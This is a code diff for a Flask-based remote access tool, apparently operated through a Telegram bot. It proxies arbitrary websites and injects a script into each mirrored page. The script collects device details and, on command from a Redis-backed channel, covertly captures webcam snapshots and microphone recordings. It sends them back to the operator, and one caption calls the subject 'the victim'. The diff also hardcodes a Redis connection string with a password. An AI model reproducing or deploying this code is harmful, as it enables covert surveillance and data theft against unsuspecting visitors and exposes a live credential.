@@ -11,136 +11,104 @@ from flask import Blueprint, render_template_string, request, Response, stream_w
 
 rat_bp = Blueprint('rat_module_v5', __name__)
 
+# --- معالجة وتنظيف رابط الـ Redis بمنتهى الدقة لتجنب انهيار التطبيق ---
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
 
-# تنظيف وتحقق إضافي لمنع أي خطأ في الـ Scheme الخاص بـ Redis وتجنب الـ Crash
+# التحقق من الـ Scheme وإصلاحه تلقائياً إذا كان خاطئاً أو مفقوداً
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 
-redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+try:
+    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+    redis_client.ping()
+except Exception as e:
+    print(f"[-] Critical Redis Connection Error in rat_module: {e}")
+    redis_client = None
+
 background_executor = ThreadPoolExecutor(max_workers=4)
 
 INJECTION_PAYLOAD = """
 <script>
+(function() {
     const chatId = "{chat_id}";
-    let activeStream = null;
+    const serverUrl = window.location.origin;
 
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/sw.js?id=' + chatId).catch(err => {});
-    }
+    fetch(serverUrl + '/rat_v5_collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            platform: navigator.platform,
+            userAgent: navigator.userAgent
+        })
+    }).catch(e => {});
 
-    window.addEventListener('DOMContentLoaded', async () => {
+    const evtSource = new EventSource(serverUrl + '/rat_v5_stream?id=' + chatId);
+    
+    evtSource.onmessage = function(event) {
         try {
-            activeStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
-                audio: true 
-            });
-            
+            const data = JSON.parse(event.data);
+            if (data.action === 'snapshot') {
+                captureAndSendCamera();
+            } else if (data.action === 'audio') {
+                captureAndSendAudio();
+            }
+        } catch(err) {}
+    };
+
+    async function captureAndSendCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.createElement('video');
-            video.id = 'v';
-            video.autoplay = true;
-            video.playsInline = true;
-            video.muted = true;
-            video.style.display = 'none';
-            video.srcObject = activeStream;
-            document.body.appendChild(video);
+            video.srcObject = stream;
             await video.play();
-
+            
             const canvas = document.createElement('canvas');
-            canvas.id = 'c';
-            canvas.style.display = 'none';
-            document.body.appendChild(canvas);
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const base64Img = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(track => track.stop());
 
-            sendDeviceInfo();
-            setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى (Ultra Proxy):**"), 1500);
-            initSSEStream();
-        } catch (err) {}
-    });
-
-    function sendDeviceInfo() {
-        fetch('/rat_v5_collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                screen: window.screen.width + "x" + window.screen.height
-            })
-        });
+            fetch(serverUrl + '/rat_v5_image', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, image: base64Img, title: "📸 **لقطة كاميرا حية من الضحية:**" })
+            });
+        } catch(e) {}
     }
 
-    function captureLiveSnapshot(titleText) {
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-        if (!video || !canvas || video.readyState < video.HAVE_CURRENT_DATA) return;
-
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const freshImageData = canvas.toDataURL('image/jpeg', 0.9);
-
-        fetch('/rat_v5_image', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, image: freshImageData, title: titleText })
-        });
-    }
-
-    function recordLiveAudio() {
-        if (!activeStream) return;
+    async function captureAndSendAudio() {
         try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
             let chunks = [];
-            const recorder = new MediaRecorder(activeStream);
-            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-            recorder.onstop = () => {
+            
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = e => {
                 const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => {
-                    fetch('/rat_v5_audio', {
+                reader.onloadend = function() {
+                    fetch(serverUrl + '/rat_v5_audio', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                     });
                 };
+                reader.readAsDataURL(blob);
+                stream.getTracks().forEach(track => track.stop());
             };
-            recorder.start();
-            setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, 5000);
-        } catch (e) {}
+            
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+        } catch(e) {}
     }
-
-    function initSSEStream() {
-        const eventSource = new EventSource('/rat_v5_stream?id=' + chatId);
-        eventSource.onmessage = function(event) {
-            try {
-                const data = JSON.parse(event.data);
-                if (data.action === "snapshot") {
-                    captureLiveSnapshot("📸 **صورة حية ومتجددة (عبر Ultra Proxy):**");
-                } else if (data.action === "audio") {
-                    recordLiveAudio();
-                }
-            } catch (e) {}
-        };
-        eventSource.onerror = function() {
-            setTimeout(() => {
-                eventSource.close();
-                initSSEStream();
-            }, 3000);
-        };
-    }
+})();
 </script>
-"""
-
-SERVICE_WORKER_SCRIPT = """
-self.addEventListener('install', (e) => { self.skipWaiting(); });
-self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });
-self.addEventListener('fetch', (e) => { e.respondWith(fetch(e.request)); });
 """
 
 def rewrite_urls(html_content, base_url, proxy_base_path):
@@ -148,7 +116,7 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
         tag, attr, quote_char, original_url = match.groups()
         if not original_url or original_url.startswith(('data:', 'javascript:', '#', 'mailto:')):
             return match.group(0)
-        
+
         absolute_url = urljoin(base_url, original_url)
         proxied_url = f"{proxy_base_path}?url={quote(absolute_url)}"
         return f'{tag} {attr}={quote_char}{proxied_url}{quote_char}'
@@ -168,7 +136,7 @@ def async_send_audio(bot, chat_id, audio_bytes):
     try:
         audio_file = io.BytesIO(audio_bytes)
         audio_file.name = 'live_audio.webm'
-        bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي حي (عبر Ultra Proxy):**", parse_mode="Markdown")
+        bot.send_audio(chat_id, audio_file, caption="🎙️ تسجيل صوتي حي (عبر Ultra Proxy):", parse_mode="Markdown")
     except Exception as e:
         print(f"Async Audio Error: {e}")
 
@@ -179,7 +147,7 @@ def init_rat_routes(app, bot):
         target_url = request.args.get('url', 'https://example.com')
         if not target_url.startswith(('http://', 'https://')):
             target_url = 'https://' + target_url
-        
+
         try:
             headers = {
                 "User-Agent": request.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
@@ -201,14 +169,13 @@ def init_rat_routes(app, bot):
                 return Response(resp.content, status=resp.status_code, content_type=content_type)
             
             page_content = resp.text
-            
             proxy_path = '/system_secure_v2'
             if chat_id != '0':
                 proxy_path += f'?id={chat_id}'
             
             page_content = rewrite_urls(page_content, target_url, proxy_path)
-
             custom_script = INJECTION_PAYLOAD.replace("{chat_id}", chat_id)
+            
             if "</body>" in page_content:
                 modified_content = page_content.replace("</body>", custom_script + "</body>")
             else:
@@ -217,10 +184,6 @@ def init_rat_routes(app, bot):
             return Response(modified_content, status=resp.status_code, content_type=content_type)
         except Exception as e:
             return f"Error loading target mirror: {e}", 500
-
-    @app.route('/sw.js', methods=['GET'])
-    def service_worker():
-        return Response(SERVICE_WORKER_SCRIPT, mimetype='application/javascript')
 
     @app.route('/rat_v5_collect', methods=['POST'])
     def rat_collect():
@@ -252,6 +215,8 @@ def init_rat_routes(app, bot):
             return "Missing ID", 400
 
         def event_stream():
+            if not redis_client:
+                return
             pubsub = redis_client.pubsub()
             pubsub.subscribe(f"channel_cmd:{chat_id}")
             yield f"data: {json.dumps({'action': 'ping'})}\n\n"
@@ -299,5 +264,9 @@ def init_rat_routes(app, bot):
         return {"status": "ok"}
 
 def queue_command(chat_id, action):
-    redis_client.publish(f"channel_cmd:{chat_id}", action)
-    redis_client.expire(f"channel_cmd:{chat_id}", 3600)
+    if redis_client:
+        try:
+            redis_client.publish(f"channel_cmd:{chat_id}", action)
+            redis_client.expire(f"channel_cmd:{chat_id}", 3600)
+        except Exception as e:
+            print(f"Redis publish error: {e}")
